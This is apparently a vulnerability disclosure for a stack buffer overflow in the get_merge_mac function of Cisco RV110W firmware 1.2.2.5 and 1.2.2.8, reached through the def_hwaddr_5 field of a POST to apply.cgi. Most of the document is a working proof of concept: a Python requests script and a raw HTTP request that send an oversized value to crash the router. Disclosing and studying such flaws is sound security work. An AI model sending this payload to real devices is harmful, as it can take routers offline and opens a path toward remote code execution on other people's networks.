
# Overview
Firmware download website: [https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.5)
[https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8](https://software.cisco.com/download/home/283879340/type/282487380/release/1.2.2.8)

# Affected version
CISCO RV110W  Firmware 1.2.2.5,1.2.2.8
# Vulnerability details
The CISCO RV110W 1.2.2.5,1.2.2.8 firmware has a stack overflow vulnerability in get_merge_mac function. The variable `def_hwaddr_%d`receives the parameter from a POST request.  In line 33 of the code, the stract function will merge it with the variable a2. It is important to note that in the calling function, the a2 variable is stack-allocated and has a size of only 24 characters. If the variable exceeds this length, it may result in a buffer overflow vulnerability, potentially leading to remote code execution or denial-of-service attacks.  
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1720359626844-c9525905-76df-491a-b971-b517dad4ec5c.png#averageHue=%23fdfdfd&clientId=udf29107c-170e-4&from=paste&height=768&id=u888876eb&originHeight=1209&originWidth=865&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=85626&status=done&style=none&taskId=u1402795a-0c58-4932-94fb-96282f2658a&title=&width=549.2063741474927)

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1720359775541-d5c20add-eb97-4209-bdd9-41d110457c40.png#averageHue=%23fbfbfb&clientId=udf29107c-170e-4&from=paste&height=192&id=ucd0f4874&originHeight=302&originWidth=877&originalType=binary&ratio=1.5749999284744263&rotation=0&showTitle=false&size=29356&status=done&style=none&taskId=u434917db-e1da-4180-996e-d36d2e845ce&title=&width=556.8254221125446)
# POC
```c
import requests

url = "https://192.168.2.2/apply.cgi;session_id=e35ab05a51dd1f8c374cb5003d4261d8"
headers = {
    "Host": "192.168.2.2",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "https://192.168.2.2",
    "Referer": "https://192.168.2.2/macclone.asp;session_id=e35ab05a51dd1f8c374cb5003d4261d8",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "iframe",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=4",
    "Te": "trailers",
    "Connection": "close"
}

data = {
    "submit_button": "macclone",
    "submit_type": "",
    "change_action": "",
    "gui_action": "Apply",
    "mac_clone_enable": "1",
    "all_start": "",
    "_mac_clone_enable": "on",
    "hwaddr_start": "",
    "def_hwaddr": "6",
    "def_hwaddr_0": "B8",
    "def_hwaddr_1": "62",
    "def_hwaddr_2": "1F",
    "def_hwaddr_3": "51",
    "def_hwaddr_4": "8A",
    "def_hwaddr_5": "111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111",
    "hwaddr_end": "",
    "webpage_end": "",
    "all_end": ""
}

response = requests.post(url, headers=headers, data=data, verify=False)

print(response.text)
```
```c
POST /apply.cgi;session_id=e35ab05a51dd1f8c374cb5003d4261d8 HTTP/1.1
Host: 192.168.2.2
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 657
Origin: https://192.168.2.2
Referer: https://192.168.2.2/macclone.asp;session_id=e35ab05a51dd1f8c374cb5003d4261d8
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4
Te: trailers
Connection: close

submit_button=macclone&submit_type=&change_action=&gui_action=Apply&mac_clone_enable=1&all_start=&_mac_clone_enable=on&hwaddr_start=&def_hwaddr=6&def_hwaddr_0=B8&def_hwaddr_1=62&def_hwaddr_2=1F&def_hwaddr_3=51&def_hwaddr_4=8A&def_hwaddr_5=111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&hwaddr_end=&webpage_end=&all_end=
```
